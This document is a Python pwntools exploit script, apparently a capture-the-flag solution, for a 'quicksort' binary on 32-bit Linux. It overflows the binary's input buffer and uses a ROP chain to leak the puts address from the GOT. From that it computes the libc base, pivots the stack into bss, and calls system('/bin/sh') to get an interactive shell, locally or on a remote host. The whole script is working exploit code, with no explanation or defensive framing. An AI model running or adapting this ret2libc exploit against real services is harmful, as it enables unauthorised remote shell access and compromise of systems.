from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./quicksort")
	libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
	elf = ELF("./quicksort")
else:
	p = remote("34.92.96.238","10000")
	libc = ELF("./libc.so.6")
	elf = ELF("./quicksort")

def debugf():
	gdb.attach(p,"b gets\nb *0x08048618")

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
#debugf()
numbers = 0x10000
p.sendlineafter("you want to sort?\n",str(numbers))
target = 0x4170c / 4
payload1 = str(0)
payload1 = payload1.ljust(0x10,"\x00")
payload1 += p32(target + 2)
payload1 += p32(target)
p.sendlineafter("number:",payload1)
target = 0
bss_addr = 0x0804A400
ebp_ret = 0x08048a5b
leave_ret = 0x08048618
payload = str(0)
payload = payload.ljust(0x10,"\x00")
payload += p32(target)
payload += p32(bss_addr/4)
payload += p32(0)
payload += p32(0)
payload = payload.ljust(0x2c + 4,"\x00")
payload += p32(elf.plt["puts"]) + p32(ebp_ret) + p32(elf.got["puts"]) + p32(elf.plt["gets"]) + p32(ebp_ret) + p32(bss_addr) + p32(leave_ret)
p.sendlineafter("number:",payload)
p.recvuntil("Here is the result:\n\n")
puts_addr = u32(p.recv(4))
libc.address = puts_addr - libc.symbols["puts"]
log.success("libc_base:" + hex(libc.address))
system = libc.symbols["system"]
binsh = libc.search("/bin/sh").next()
payload = "junk" + p32(system) + "junk" + p32(binsh)
p.sendline(payload)
p.interactive() 
